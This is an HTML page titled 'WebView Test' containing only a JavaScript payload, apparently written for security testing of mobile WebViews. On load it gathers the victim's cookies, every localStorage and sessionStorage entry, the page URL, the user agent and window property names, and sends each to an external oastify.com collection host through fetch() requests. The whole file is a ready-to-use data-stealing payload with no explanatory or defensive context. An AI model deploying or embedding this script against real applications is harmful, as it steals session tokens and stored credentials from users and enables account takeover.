<!DOCTYPE html>
<html>
<head>
    <title>WebView Test</title>
</head>
<body>
<script>
(function() {
    var OAST = "https://fexw98s0l8o6hjnzjrq4aiu6mxsqgg45.oastify.com";

    function send(label, data) {
        try {
            fetch(OAST + "/?" + label + "=" + encodeURIComponent(data));
        } catch (e) {}
    }

    // 1. Basic execution check
    send("status", "js_executed");

    // 2. Cookie test
    try {
        send("cookie", document.cookie || "EMPTY");
    } catch (e) {
        send("cookie_error", e.toString());
    }

    // 3. LocalStorage test
    try {
        var ls = "";
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            ls += key + "=" + localStorage.getItem(key) + ";";
        }
        send("localStorage", ls || "EMPTY");
    } catch (e) {
        send("ls_error", e.toString());
    }

    // 4. SessionStorage test
    try {
        var ss = "";
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            ss += key + "=" + sessionStorage.getItem(key) + ";";
        }
        send("sessionStorage", ss || "EMPTY");
    } catch (e) {
        send("ss_error", e.toString());
    }

    // 5. Location info
    try {
        send("location", window.location.href);
    } catch (e) {}

    // 6. User agent
    try {
        send("ua", navigator.userAgent);
    } catch (e) {}

    // 7. Try access window objects (kadang ada leak)
    try {
        var props = [];
        for (var p in window) {
            props.push(p);
        }
        send("window_props", props.slice(0,50).join(","));
    } catch (e) {}

})();
</script>
</body>
</html>
